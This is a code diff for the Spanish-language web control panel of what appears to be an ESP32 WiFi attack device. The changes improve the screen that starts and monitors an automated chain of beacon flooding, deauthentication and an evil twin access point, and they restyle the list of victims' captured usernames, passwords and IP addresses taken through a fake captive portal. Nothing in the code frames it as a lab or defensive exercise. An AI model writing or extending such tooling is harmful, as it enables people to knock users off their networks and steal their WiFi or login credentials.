@@ -1,18 +1,30 @@
 let _attackPollInterval = null;
 
+const PHASE_LABELS = {
+  IDLE: 'EN ESPERA',
+  FASE_1: 'FASE 1 — BEACON FLOOD',
+  FASE_2: 'FASE 2 — DEAUTH',
+  FASE_3: 'FASE 3 — EVIL TWIN',
+  FINALIZADO: 'FINALIZADO',
+};
+
 function renderAttack() {
   const el = document.getElementById('view-attack');
   el.innerHTML = `
     <div class="max-w-2xl">
       <div class="flex items-center justify-between mb-6">
-        <h2 class="text-xl font-bold">Ataque en Progreso</h2>
+        <div>
+          <h2 class="text-xl font-bold">Ataque en Progreso</h2>
+          <p class="text-xs text-gray-400 mt-1">Cadena automatica: Beacon Flood &rarr; Deauth &rarr; Evil Twin</p>
+        </div>
         <button onclick="stopAttack()"
           class="px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg font-bold">
           DETENER
         </button>
       </div>
+      <div id="attack-error" class="hidden mb-4 bg-red-900 border border-red-600 rounded p-3 text-sm text-red-300"></div>
       <div class="bg-gray-800 rounded-xl p-6 mb-6">
-        <div class="text-4xl font-bold text-center mb-2" id="attack-phase">INICIANDO</div>
+        <div class="text-3xl font-bold text-center mb-2" id="attack-phase">INICIANDO...</div>
         <div class="text-sm text-center text-gray-400" id="attack-timer">00:00</div>
       </div>
       <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
@@ -34,36 +46,65 @@ function renderAttack() {
         </div>
       </div>
       <div class="bg-gray-800 rounded-xl p-4">
-        <h3 class="font-semibold mb-3">Credenciales Capturadas</h3>
+        <h3 class="font-semibold mb-3">Credenciales Capturadas <span id="cred-badge" class="hidden ml-2 text-xs bg-green-600 text-white px-2 py-0.5 rounded-full">NUEVO</span></h3>
+        <p class="text-xs text-gray-500 mb-3">Capturadas cuando una victima se conecta al Evil Twin y envia su contrasena al portal cautivo.</p>
         <ul id="cred-list" class="space-y-2 text-sm font-mono"></ul>
         <p id="no-creds" class="text-gray-500 text-sm">Sin credenciales aun.</p>
       </div>
     </div>`;
 
-  // Start attack + poll
-  api.attackStart({ modo: 'cadena_automatica' });
+  startOrResumeAttack();
+}
+
+async function startOrResumeAttack() {
+  // Check if attack is already running before trying to start
+  try {
+    const status = await api.attackStatus();
+    if (status.ataque_activo) {
+      // Already running — just poll
+    } else {
+      const r = await api.attackStart({ modo: 'cadena_automatica' });
+      if (r.ok === false) {
+        const errEl = document.getElementById('attack-error');
+        if (errEl) {
+          errEl.textContent = 'Error al iniciar: ' + (r.error || r.codigo);
+          errEl.classList.remove('hidden');
+        }
+        return;
+      }
+    }
+  } catch(e) {
+    const errEl = document.getElementById('attack-error');
+    if (errEl) {
+      errEl.textContent = 'No se pudo contactar el ESP32.';
+      errEl.classList.remove('hidden');
+    }
+    return;
+  }
+
   if (_attackPollInterval) clearInterval(_attackPollInterval);
   _attackPollInterval = setInterval(pollAttackStatus, 1000);
 }
 
 async function pollAttackStatus() {
   try {
-    const data = await api.attackStatus();
-    const fase = data.estado_cadena || 'IDLE';
-    document.getElementById('attack-phase').textContent = fase;
-    const elapsed = data.tiempo_transcurrido_seg || 0;
+    // /attack/status has phase + timer; /status has counters
+    const [atk, full] = await Promise.all([api.attackStatus(), api.status()]);
+    const fase = atk.estado_cadena || 'IDLE';
+    document.getElementById('attack-phase').textContent = PHASE_LABELS[fase] || fase;
+    const elapsed = atk.tiempo_transcurrido_seg || 0;
     const mm = String(Math.floor(elapsed / 60)).padStart(2, '0');
     const ss = String(elapsed % 60).padStart(2, '0');
     document.getElementById('attack-timer').textContent = `${mm}:${ss}`;
 
-    const cnt = data.contadores || {};
+    const cnt = full.contadores || {};
     document.getElementById('cnt-beacons').textContent = cnt.beacons_emitidos || 0;
     document.getElementById('cnt-deauths').textContent = cnt.deauths_emitidos || 0;
     document.getElementById('cnt-clients').textContent = cnt.clientes_evil_twin || 0;
-    document.getElementById('cnt-creds').textContent = cnt.credenciales_capturadas || 0;
+    const credCount = cnt.credenciales_capturadas || 0;
+    document.getElementById('cnt-creds').textContent = credCount;
 
-    // Fetch credentials periodically
-    if ((cnt.credenciales_capturadas || 0) > 0) {
+    if (credCount > 0) {
       const cdata = await api.credentials();
       renderCredentials(cdata.credenciales || []);
     }
@@ -71,7 +112,7 @@ async function pollAttackStatus() {
     if (fase === 'FINALIZADO') {
       clearInterval(_attackPollInterval);
       _attackPollInterval = null;
-      setTimeout(() => showView('summary'), 1000);
+      setTimeout(() => showView('summary'), 1500);
     }
   } catch(e) {}
 }
@@ -79,10 +120,15 @@ async function pollAttackStatus() {
 function renderCredentials(creds) {
   const list = document.getElementById('cred-list');
   const none = document.getElementById('no-creds');
+  const badge = document.getElementById('cred-badge');
   if (!creds.length) return;
   none.style.display = 'none';
+  if (badge) badge.classList.remove('hidden');
   list.innerHTML = creds.map(c =>
-    `<li class="bg-gray-700 rounded p-2">${c.usuario} / ${c.password} <span class="text-gray-400">(${c.cliente_ip})</span></li>`
+    `<li class="bg-gray-700 rounded p-2">
+       <span class="text-green-400">${c.usuario}</span> / <span class="text-yellow-300">${c.password}</span>
+       <span class="text-gray-400 text-xs ml-2">${c.cliente_ip} &bull; ${new Date(c.timestamp_ms).toLocaleTimeString()}</span>
+     </li>`
   ).join('');
 }
 
